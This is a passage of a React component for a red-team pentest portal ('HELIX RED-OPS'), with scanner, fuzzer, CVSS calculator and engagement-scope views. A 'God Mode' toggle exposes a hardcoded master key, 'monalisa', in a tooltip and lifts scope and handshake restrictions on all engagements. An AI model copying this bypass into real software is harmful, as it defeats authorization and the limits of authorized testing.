  const filteredFindings = findings.filter(f => {
    const matchesSearch = f.title.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          f.description.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesSeverity = severityFilter === 'all' || f.severity === severityFilter;
    const matchesEngagement = isAdminMode || f.engagementId === selectedEngagement.id;
    return matchesSearch && matchesSeverity && matchesEngagement;
  });

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-100 font-sans selection:bg-red-600 selection:text-white pb-16">
      
      {/* 🔴 Top Live Threat Ops Bar & Admin Key HUD */}
      <header className="sticky top-0 z-40 bg-[#080808]/95 backdrop-blur-md border-b border-red-900/30 px-4 py-2.5">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-3">
          
          {/* Logo & Live Status */}
          <div className="flex items-center gap-3 w-full md:w-auto justify-between md:justify-start">
            <div className="flex items-center gap-2.5">
              <div className="p-2 bg-red-950/70 border border-red-600/50 rounded-lg text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
                <Shield className="w-5 h-5" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h1 className="text-sm font-bold tracking-wider uppercase font-mono text-zinc-100">
                    HELIX <span className="text-red-500">RED-OPS</span>
                  </h1>
                  <span className="px-1.5 py-0.2 bg-red-950 border border-red-800/80 rounded text-[9px] font-mono text-red-400 font-bold tracking-widest uppercase">
                    LIVE OPS
                  </span>
                </div>
                <p className="text-[10px] text-zinc-400 font-mono flex items-center gap-1.5">
                  <span className="inline-block w-1.5 h-1.5 rounded-full bg-red-500 animate-ping" />
                  REAL-TIME ENGAGEMENT PORTAL • {timeString || 'LIVE'}
                </p>
              </div>
            </div>

            {/* Mobile Admin God Mode Quick Toggle */}
            <div className="md:hidden">
              <button
                onClick={toggleAdminGodMode}
                className={`px-2.5 py-1 rounded text-xs font-mono font-bold flex items-center gap-1 border transition-all ${
                  isAdminMode 
                    ? 'bg-red-600 text-white border-red-500 shadow-[0_0_10px_rgba(239,68,68,0.6)]' 
                    : 'bg-zinc-900 text-zinc-400 border-zinc-800'
                }`}
              >
                <Crown className="w-3.5 h-3.5" />
                {isAdminMode ? 'GOD MODE' : 'ADMIN KEY'}
              </button>
            </div>
          </div>

          {/* Active Target Engagement Quick Switcher */}
          <div className="flex items-center gap-2 w-full md:w-auto justify-end">
            <div className="flex items-center gap-1.5 px-3 py-1 bg-zinc-950 border border-zinc-800 rounded-lg text-xs font-mono">
              <span className="text-zinc-500">TARGET:</span>
              <select
                value={selectedEngagement.id}
                onChange={(e) => {
                  const matched = engagements.find(eng => eng.id === e.target.value);
                  if (matched) setSelectedEngagement(matched);
                }}
                className="bg-transparent text-red-400 font-bold focus:outline-none cursor-pointer"
              >
                {engagements.map(eng => (
                  <option key={eng.id} value={eng.id} className="bg-zinc-900 text-zinc-100">
                    {eng.id} ({eng.clientName})
                  </option>
                ))}
              </select>
              <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold uppercase ${
                selectedEngagement.status === 'established' || isAdminMode 
                  ? 'bg-red-950/80 text-red-400 border border-red-800' 
                  : 'bg-amber-950/80 text-amber-400 border border-amber-800'
              }`}>
                {isAdminMode ? 'UNRESTRICTED' : selectedEngagement.status}
              </span>
            </div>

            {/* Active Operator Profile Quick Pill */}
            <button
              onClick={() => setIsProfileSwitcherOpen(true)}
              className="flex items-center gap-2 px-2.5 py-1 bg-zinc-950 border border-zinc-800 hover:border-red-800/80 rounded-lg text-xs font-mono transition-colors cursor-pointer"
              title="Switch user profile or manage API keys"
            >
              <span className="w-5 h-5 rounded bg-red-950 border border-red-800 text-red-400 font-bold flex items-center justify-center text-[10px]">
                {activeProfile.avatarInitials}
              </span>
              <span className="text-zinc-200 font-bold hidden sm:inline max-w-[120px] truncate">
                {activeProfile.name}
              </span>
              <span className="px-1.5 py-0.2 bg-zinc-900 text-amber-400 rounded text-[9px] font-bold border border-zinc-800">
                {activeProfile.apiKeys.length} Keys
              </span>
            </button>

            {/* Quick SIEM Audit Indicator */}
            <button
              onClick={() => setActiveTab('audit-logs')}
              className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-mono font-bold border transition-all cursor-pointer ${
                activeTab === 'audit-logs'
                  ? 'bg-red-950/80 text-red-400 border-red-700'
                  : 'bg-zinc-950 text-zinc-400 border-zinc-800 hover:border-zinc-700'
              }`}
              title="Open append-only SIEM audit log viewer"
            >
              <ShieldCheck className="w-3.5 h-3.5 text-blue-400" />
              <span className="hidden sm:inline">AUDIT:</span>
              <span className="text-zinc-200">{auditLogs.length}</span>
            </button>

            {/* Desktop Admin God Mode (monalisa) Bar */}
            <div className="hidden md:flex items-center gap-2">
              <button
                onClick={toggleAdminGodMode}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 border transition-all ${
                  isAdminMode 
                    ? 'bg-red-600 text-white border-red-500 shadow-[0_0_15px_rgba(239,68,68,0.7)] animate-pulse' 
                    : 'bg-zinc-900 text-zinc-300 border-zinc-800 hover:border-red-900 hover:text-white'
                }`}
                title="Admin Master Key: monalisa (Lifts all security constraints)"
              >
                <Crown className="w-3.5 h-3.5 text-amber-400" />
                {isAdminMode ? '👑 GOD MODE ACTIVE (monalisa)' : 'UNLOCK ADMIN KEY'}
              </button>
            </div>
          </div>
        </div>

        {/* Global Admin Message Banner */}
        {adminMessage && (
          <div className="mt-2 text-center text-xs font-mono font-bold text-red-400 bg-red-950/70 border border-red-800 py-1 rounded max-w-7xl mx-auto animate-pulse">
            {adminMessage}
          </div>
        )}
      </header>

      {/* 🧭 Crystal-Clear Navigation Hub */}
      <nav className="border-b border-zinc-900 bg-[#090909]/80 sticky top-[53px] z-30 px-4">
        <div className="max-w-7xl mx-auto flex items-center gap-1 overflow-x-auto py-2 scrollbar-none">
          {[
            { id: 'dashboard', label: 'Threat HUD & KPIs', icon: Activity },
            { id: 'scanner', label: 'Live Scanner & Fuzzer', icon: Zap },
            { id: 'engagements', label: 'Scope Engagements', icon: Crosshair },
            { id: 'findings', label: `Findings Vault (${filteredFindings.length})`, icon: AlertTriangle },
            { id: 'payloads', label: 'Payload & Shell Forge', icon: Code },
            { id: 'osint', label: 'DNS & Subdomain Radar', icon: Globe },
            { id: 'ai-hunter', label: 'AI Threat Hunter', icon: Brain },
            { id: 'terminal', label: 'VPS Terminal CLI', icon: Terminal },
            { id: 'audit-logs', label: `SIEM Audit Logs (${auditLogs.length})`, icon: ShieldCheck },
            { id: 'profiles', label: `Profiles & API Keys (${profiles.length})`, icon: User },
            { id: 'admin-ops', label: 'Admin Master Ops', icon: Crown }
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg text-xs font-mono font-bold whitespace-nowrap transition-all cursor-pointer ${
                  isActive 
                    ? 'bg-red-600 text-white shadow-[0_0_12px_rgba(220,38,38,0.5)] border border-red-500' 
                    : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-900 border border-transparent'
                }`}
              >
                <Icon className={`w-3.5 h-3.5 ${isActive ? 'text-white' : 'text-red-400'}`} />
                {tab.label}
              </button>
            );
          })}
        </div>
      </nav>

      {/* 🚀 Main Application Body */}
      <main className="max-w-7xl mx-auto px-4 mt-6 space-y-6">

        {/* ══════════════════════════════════════════════════════════════════
            TAB 1: THREAT HUD & REAL-TIME DASHBOARD
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'dashboard' && (
          <div className="space-y-6">
            
            {/* Top Operational Metrics HUD */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-4 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-16 h-16 bg-red-600/5 rounded-bl-full pointer-events-none" />
                <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-wider block">Critical Flaws</span>
                <div className="flex items-baseline gap-2 mt-1">
                  <span className="text-2xl font-bold font-mono text-red-500">
                    {findings.filter(f => f.severity === 'critical').length}
                  </span>
                  <span className="text-xs text-red-400 font-mono">Immediate Action</span>
                </div>
                <div className="mt-2 h-1 bg-zinc-900 rounded-full overflow-hidden">
                  <div className="h-full bg-red-600 w-3/4" />
                </div>
              </div>

              <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-4 relative overflow-hidden">
                <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-wider block">Active Scope Targets</span>
                <div className="flex items-baseline gap-2 mt-1">
                  <span className="text-2xl font-bold font-mono text-zinc-100">
                    {engagements.reduce((acc, eng) => acc + eng.scope.length, 0)}
                  </span>
                  <span className="text-xs text-zinc-400 font-mono">Endpoints</span>
                </div>
                <div className="mt-2 h-1 bg-zinc-900 rounded-full overflow-hidden">
                  <div className="h-full bg-zinc-600 w-full" />
                </div>
              </div>

              <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-4 relative overflow-hidden">
                <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-wider block">Compliance Health</span>
                <div className="flex items-baseline gap-2 mt-1">
                  <span className="text-2xl font-bold font-mono text-red-400">84.2%</span>
                  <span className="text-xs text-zinc-400 font-mono">SOC2 / NIST</span>
                </div>
                <div className="mt-2 h-1 bg-zinc-900 rounded-full overflow-hidden">
                  <div className="h-full bg-red-500 w-[84%]" />
                </div>
              </div>

              <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-4 relative overflow-hidden">
                <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-wider block">Operator Privilege</span>
                <div className="flex items-baseline gap-2 mt-1">
                  <span className="text-sm font-bold font-mono text-red-500">
                    {isAdminMode ? 'ROOT / GOD MODE' : 'AUTHORIZED SEC-OP'}
                  </span>
                </div>
                <span className="text-[10px] text-zinc-500 font-mono mt-1 block">
                  {isAdminMode ? 'Key: monalisa (Bypass Active)' : 'Scope Restricted'}
                </span>
              </div>
            </div>

            {/* Threat Radar & Live Event Stream Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              
              {/* Radar & Active Target Card */}
              <div className="lg:col-span-2 bg-[#0a0a0a] border border-zinc-850 rounded-xl p-5 space-y-4">
                <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
                  <div className="flex items-center gap-2">
                    <RadioTower className="w-4 h-4 text-red-500" />
                    <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-zinc-100">
                      Live Perimeter Radar & Active Target
                    </h3>
                  </div>
                  <span className="text-[10px] font-mono text-red-400 bg-red-950/60 border border-red-900/50 px-2 py-0.5 rounded">
                    PROBING {selectedEngagement.scope[0]}
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {/* Visual Radar Mockup */}
                  <div className="relative h-56 bg-black border border-red-900/40 rounded-xl flex items-center justify-center overflow-hidden">
                    <div className="absolute inset-0 cyber-grid opacity-40" />
                    {/* Radar concentric rings */}
                    <div className="absolute w-44 h-44 rounded-full border border-red-900/30" />
                    <div className="absolute w-32 h-32 rounded-full border border-red-800/40" />
                    <div className="absolute w-16 h-16 rounded-full border border-red-700/50" />
                    <div className="absolute w-full h-[1px] bg-red-900/30" />
                    <div className="absolute h-full w-[1px] bg-red-900/30" />
                    {/* Rotating beam */}
                    <div className="absolute inset-0 radar-sweep rounded-full pointer-events-none" />
                    {/* Blips */}
                    <div className="absolute top-14 left-20 w-2 h-2 rounded-full bg-red-500 animate-ping" />
                    <div className="absolute bottom-16 right-24 w-2 h-2 rounded-full bg-red-400" />
                    <div className="absolute top-28 right-16 w-1.5 h-1.5 rounded-full bg-amber-400" />
                    
                    <div className="absolute bottom-2 left-3 text-[9px] font-mono text-zinc-500">
                      RADAR SWEEP: 360° • ACTIVE INGRESS
                    </div>
                  </div>

                  {/* Target Scope Details */}
                  <div className="space-y-3 font-mono text-xs">
                    <div className="p-3 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1.5">
                      <span className="text-[10px] text-zinc-500 uppercase">Target Client:</span>
                      <p className="font-bold text-zinc-100 text-sm">{selectedEngagement.clientName}</p>
                      <div className="flex items-center gap-2 mt-1">
                        <span className="text-[10px] text-red-400 font-bold">{selectedEngagement.id}</span>
                        <span className="text-[10px] text-zinc-400">• {selectedEngagement.complianceFramework}</span>
                      </div>
                    </div>

                    <div className="space-y-1">
                      <span className="text-[10px] text-zinc-500 uppercase">Scope Hostnames:</span>
                      <div className="space-y-1">
                        {selectedEngagement.scope.map((host, i) => (
                          <div key={i} className="flex items-center justify-between p-2 bg-black border border-zinc-900 rounded text-[11px]">
                            <span className="text-zinc-300 font-bold">{host}</span>
                            <button
                              onClick={() => {
                                setScannerTarget(host);
                                setActiveTab('scanner');
                              }}
                              className="text-[10px] text-red-400 hover:text-red-300 font-bold"
                            >
                              [Scan Host]
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Real-Time Live Threat Activity Stream */}
              <div className="bg-[#0a0a0a] border border-zinc-850 rounded-xl p-5 space-y-4 flex flex-col justify-between">
                <div>
                  <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
                    <div className="flex items-center gap-2">
                      <Activity className="w-4 h-4 text-red-500 animate-pulse" />
                      <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-zinc-100">
                        Live SecOps Event Stream
                      </h3>
                    </div>
                    <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                  </div>

                  <div className="space-y-2 mt-3 max-h-64 overflow-y-auto pr-1">
                    {threatEvents.map(ev => (
                      <div key={ev.id} className="p-2.5 bg-black border border-zinc-900 rounded-lg text-xs font-mono space-y-0.5">
                        <div className="flex items-center justify-between text-[10px] text-zinc-500">
                          <span>{ev.time}</span>
                          <span className={`font-bold uppercase ${
                            ev.type === 'critical' ? 'text-red-500' : ev.type === 'alert' ? 'text-amber-400' : 'text-zinc-400'
                          }`}>
                            {ev.type}
                          </span>
                        </div>
                        <p className="text-zinc-300 text-[11px] leading-relaxed">{ev.msg}</p>
                      </div>
                    ))}
                  </div>
                </div>

                <button
                  onClick={dispatchWebhookAlert}
                  className="w-full py-2 bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-zinc-300 hover:text-white rounded-lg text-xs font-mono font-bold flex items-center justify-center gap-2 transition-all cursor-pointer"
                >
                  <Send className="w-3.5 h-3.5 text-red-400" />
                  Dispatch SIEM Webhook Alert
                </button>
                {webhookStatus && (
                  <div className="text-[10px] font-mono text-center text-red-400 bg-red-950/60 p-1 rounded border border-red-900">
                    {webhookStatus}
                  </div>
                )}
              </div>
            </div>

            {/* Real-Time Interactive CVSS v3.1 Matrix Calculator */}
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-zinc-850 pb-3">
                <div className="flex items-center gap-2">
                  <Scale className="w-4 h-4 text-red-500" />
                  <div>
                    <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-zinc-100">
                      Real-Time CVSS v3.1 Threat Matrix & Vector Calculator
                    </h3>
                    <p className="text-[10px] text-zinc-400 font-mono">
                      Compute quantitative exploitability and base vulnerability metrics
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center gap-3">
                  <div className="text-right">
                    <span className="text-[10px] text-zinc-500 font-mono block">BASE SEVERITY SCORE</span>
                    <span className={`text-xl font-mono font-bold ${
                      Number(cvssScore) >= 9.0 ? 'text-red-500' : Number(cvssScore) >= 7.0 ? 'text-orange-400' : 'text-amber-400'
                    }`}>
                      {cvssScore} / 10.0 ({Number(cvssScore) >= 9.0 ? 'CRITICAL' : Number(cvssScore) >= 7.0 ? 'HIGH' : 'MEDIUM'})
                    </span>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-3 font-mono text-xs">
                {/* Attack Vector */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Attack Vector (AV)</span>
                  <select
                    value={cvssAv}
                    onChange={(e: any) => setCvssAv(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="N">Network (N)</option>
                    <option value="A">Adjacent (A)</option>
                    <option value="L">Local (L)</option>
                    <option value="P">Physical (P)</option>
                  </select>
                </div>

                {/* Attack Complexity */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Complexity (AC)</span>
                  <select
                    value={cvssAc}
                    onChange={(e: any) => setCvssAc(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="L">Low (L)</option>
                    <option value="H">High (H)</option>
                  </select>
                </div>

                {/* Privileges Required */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Privileges (PR)</span>
                  <select
                    value={cvssPr}
                    onChange={(e: any) => setCvssPr(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="N">None (N)</option>
                    <option value="L">Low (L)</option>
                    <option value="H">High (H)</option>
                  </select>
                </div>

                {/* User Interaction */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">User Action (UI)</span>
                  <select
                    value={cvssUi}
                    onChange={(e: any) => setCvssUi(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="N">None (N)</option>
                    <option value="R">Required (R)</option>
                  </select>
                </div>

                {/* Scope */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Scope (S)</span>
                  <select
                    value={cvssScope}
                    onChange={(e: any) => setCvssScope(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="U">Unchanged (U)</option>
                    <option value="C">Changed (C)</option>
                  </select>
                </div>

                {/* Confidentiality */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Confidentiality</span>
                  <select
                    value={cvssConf}
                    onChange={(e: any) => setCvssConf(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="H">High (H)</option>
                    <option value="L">Low (L)</option>
                    <option value="N">None (N)</option>
                  </select>
                </div>

                {/* Integrity */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Integrity (I)</span>
                  <select
                    value={cvssInteg}
                    onChange={(e: any) => setCvssInteg(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="H">High (H)</option>
                    <option value="L">Low (L)</option>
                    <option value="N">None (N)</option>
                  </select>
                </div>

                {/* Availability */}
                <div className="p-2.5 bg-zinc-950 border border-zinc-850 rounded-lg space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase block">Availability (A)</span>
                  <select
                    value={cvssAvail}
                    onChange={(e: any) => setCvssAvail(e.target.value)}
                    className="w-full bg-black border border-zinc-800 text-zinc-200 text-xs p-1 rounded font-mono focus:outline-none focus:border-red-500"
                  >
                    <option value="H">High (H)</option>
                    <option value="L">Low (L)</option>
                    <option value="N">None (N)</option>
                  </select>
                </div>
              </div>

              {/* Vector Output String */}
              <div className="flex items-center justify-between p-3 bg-black border border-zinc-850 rounded-lg font-mono text-xs">
                <div className="flex items-center gap-2 overflow-x-auto">
                  <span className="text-zinc-500">VECTOR:</span>
                  <code className="text-red-400 font-bold">{cvssVector}</code>
                </div>
                <button
                  onClick={() => copyToClipboard(cvssVector, 'cvss')}
                  className="px-2.5 py-1 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 hover:text-white rounded border border-zinc-800 font-bold shrink-0 cursor-pointer"
                >
                  {copiedText === 'cvss' ? 'Copied!' : 'Copy Vector'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 2: LIVE SCANNER & REAL-TIME FUZZER
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'scanner' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-zinc-850 pb-3">
                <div className="flex items-center gap-2">
                  <Zap className="w-5 h-5 text-red-500" />
                  <div>
                    <h3 className="text-sm font-bold font-mono uppercase text-zinc-100">
                      Real-Time Target Perimeter Scanner & Automated Fuzzer
                    </h3>
                    <p className="text-xs text-zinc-400">
                      Active probe for open TCP ports, HTTP security headers, TLS ciphers, and OWASP Top 10 vulnerabilities
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs font-mono text-zinc-400">SCAN MODE:</span>
                  <div className="flex bg-zinc-950 p-1 rounded-lg border border-zinc-800">
                    {(['ports', 'headers', 'ssl', 'fuzz'] as const).map(type => (
                      <button
                        key={type}
                        onClick={() => setScanType(type)}
                        className={`px-3 py-1 rounded text-xs font-mono font-bold uppercase transition-all cursor-pointer ${
                          scanType === type ? 'bg-red-600 text-white' : 'text-zinc-400 hover:text-zinc-200'
                        }`}
                      >
                        {type}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              {/* Target Input Bar */}
              <div className="flex flex-col sm:flex-row gap-3">
                <div className="relative flex-1">
                  <Globe className="absolute left-3 top-3 w-4 h-4 text-zinc-500" />
                  <input
                    type="text"
                    value={scannerTarget}
                    onChange={(e) => setScannerTarget(e.target.value)}
                    placeholder="Enter target IP, hostname, or API domain (e.g. api.runehall.com)"
                    className="w-full pl-10 pr-4 py-2.5 bg-black border border-zinc-800 rounded-lg text-sm text-zinc-100 font-mono focus:outline-none focus:border-red-500 transition-colors"
                  />
                </div>
                <button
                  onClick={executeScan}
                  disabled={isScanning}
                  className="px-6 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold font-mono rounded-lg text-xs tracking-wider flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.4)] disabled:opacity-50 transition-all cursor-pointer"
                >
                  <RefreshCw className={`w-4 h-4 ${isScanning ? 'animate-spin' : ''}`} />
                  {isScanning ? 'PROBING TARGET...' : 'EXECUTE REAL-TIME SCAN'}
                </button>
              </div>

              {/* Terminal Log Output */}
              {scanLog.length > 0 && (
                <div className="p-3 bg-black border border-zinc-900 rounded-lg font-mono text-[11px] text-zinc-400 space-y-1 max-h-32 overflow-y-auto">
                  {scanLog.map((line, idx) => (
                    <div key={idx} className="flex items-center gap-1.5">
                      <span className="text-red-500 font-bold">&gt;&gt;</span>
                      <span>{line}</span>
                    </div>
                  ))}
                </div>
              )}

              {/* Scan Results Display */}
              {scanResults && (
                <div className="space-y-4 pt-3 border-t border-zinc-850">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400">
                      TARGET: <strong className="text-red-400">{scanResults.host}</strong> ({scanResults.action?.toUpperCase()})
                    </span>
                    <span className="text-zinc-500">{scanResults.scannedAt}</span>
                  </div>

                  {/* Ports Table */}
                  {scanResults.action === 'port-scan' && scanResults.results && (
                    <div className="border border-zinc-800 rounded-lg overflow-hidden font-mono text-xs">
                      <table className="w-full text-left">
                        <thead className="bg-zinc-950 text-zinc-400 text-[10px] uppercase border-b border-zinc-800">
                          <tr>
                            <th className="p-3">Port</th>
                            <th className="p-3">Service</th>
                            <th className="p-3">Status</th>
                            <th className="p-3">Latency</th>
                            <th className="p-3">Service Banner</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-zinc-900 bg-black">
                          {scanResults.results.map((r: any, i: number) => (
                            <tr key={i} className="hover:bg-zinc-950/60 transition-colors">
                              <td className="p-3 font-bold text-zinc-200">{r.port}</td>
                              <td className="p-3 text-zinc-400">{r.service}</td>
                              <td className="p-3">
                                <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                  r.status === 'open' ? 'bg-red-950 text-red-400 border border-red-800' : 'bg-zinc-900 text-zinc-500'
                                }`}>
                                  {r.status}
                                </span>
                              </td>
                              <td className="p-3 text-zinc-500">{r.latency}</td>
                              <td className="p-3 text-zinc-400 text-[11px]">{r.banner}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {/* OWASP Fuzzer Results */}
                  {scanResults.action === 'fuzz' && scanResults.results && (
                    <div className="space-y-2 font-mono text-xs">
                      {scanResults.results.map((f: any, i: number) => (
                        <div key={i} className="p-3 bg-black border border-zinc-850 rounded-lg flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                f.status === 'VULNERABLE' ? 'bg-red-950 text-red-400 border border-red-800' : 'bg-zinc-900 text-zinc-400'
                              }`}>
                                {f.status}
                              </span>
                              <strong className="text-zinc-200">{f.test}</strong>
                            </div>
                            <p className="text-[11px] text-zinc-400">{f.detail}</p>
                          </div>
                          <div className="p-1.5 bg-zinc-950 rounded text-[10px] text-red-400 border border-zinc-800 max-w-xs truncate">
                            <code>{f.payload}</code>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* SSL / Headers Display */}
                  {(scanResults.sslReport || scanResults.headers) && (
                    <pre className="p-4 bg-black border border-zinc-850 rounded-lg text-xs font-mono text-red-400 overflow-x-auto">
                      {JSON.stringify(scanResults.sslReport || scanResults.headers, null, 2)}
                    </pre>
                  )}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 3: SCOPE ENGAGEMENTS & HANDSHAKE MANAGER
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'engagements' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <h3 className="text-base font-bold font-mono text-zinc-100 flex items-center gap-2">
                  <Crosshair className="w-5 h-5 text-red-500" />
                  Target Scope Registry & Handshake Manager
                </h3>
                <p className="text-xs text-zinc-400 mt-0.5">
                  Manage active client pentest scopes and authenticate cryptographic access
                </p>
              </div>

              <button
                onClick={() => setIsNewEngagementOpen(true)}
                className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg flex items-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.4)] transition-all cursor-pointer"
              >
                <Plus className="w-4 h-4" />
                Register New Scope Target
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {engagements.map((eng) => {
                const isCurrent = selectedEngagement.id === eng.id;
                const isUnlocked = eng.status === 'established' || isAdminMode;

                return (
                  <div
                    key={eng.id}
                    className={`bg-[#0a0a0a] border rounded-xl p-5 space-y-4 transition-all ${
                      isCurrent ? 'border-red-600/70 shadow-[0_0_20px_rgba(239,68,68,0.15)]' : 'border-zinc-850 hover:border-zinc-700'
                    }`}
                  >
                    <div className="flex items-start justify-between">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-mono font-bold text-red-400">{eng.id}</span>
                          <span className={`px-2 py-0.5 rounded text-[9px] font-mono font-bold uppercase ${
                            isUnlocked ? 'bg-red-950 text-red-400 border border-red-800' : 'bg-amber-950 text-amber-400 border border-amber-800'
                          }`}>
                            {isUnlocked ? 'ESTABLISHED / UNLOCKED' : 'PENDING HANDSHAKE'}
                          </span>
                        </div>
                        <h4 className="text-base font-bold text-zinc-100 mt-1">{eng.clientName}</h4>
                        <p className="text-xs text-zinc-400">{eng.type}</p>
                      </div>

                      <div className="p-2 bg-zinc-950 border border-zinc-800 rounded-lg text-zinc-400">
                        {isUnlocked ? <Unlock className="w-5 h-5 text-red-400" /> : <Lock className="w-5 h-5 text-amber-400" />}
                      </div>
                    </div>

                    <div className="space-y-2 text-xs font-mono">
                      <div>
                        <span className="text-[10px] text-zinc-500 uppercase">Target Endpoints:</span>
                        <div className="flex flex-wrap gap-1.5 mt-1">
                          {eng.scope.map((s, idx) => (
                            <span key={idx} className="px-2 py-0.5 bg-black border border-zinc-900 rounded text-zinc-300 text-[11px]">
                              {s}
                            </span>
                          ))}
                        </div>
                      </div>

                      <div className="flex items-center justify-between pt-2 border-t border-zinc-900 text-[11px] text-zinc-400">
                        <span>Framework: <strong className="text-zinc-200">{eng.complianceFramework}</strong></span>
                        <span>Class: <strong className="text-red-400">{eng.securityClass}</strong></span>
                      </div>
                    </div>

                    <div className="flex flex-wrap gap-2 pt-2">
                      <button
                        onClick={() => setSelectedEngagement(eng)}
                        className={`flex-1 py-2 rounded-lg text-xs font-mono font-bold transition-all cursor-pointer ${
                          isCurrent 
                            ? 'bg-red-950 text-red-300 border border-red-800' 
                            : 'bg-zinc-900 hover:bg-zinc-800 text-zinc-300 border border-zinc-800'
                        }`}
                      >
                        {isCurrent ? 'ACTIVE SELECTION' : 'SELECT AS TARGET'}
                      </button>

                      <button
                        onClick={() => {
                          const engFindings = findings.filter(f => f.engagementId === eng.id);
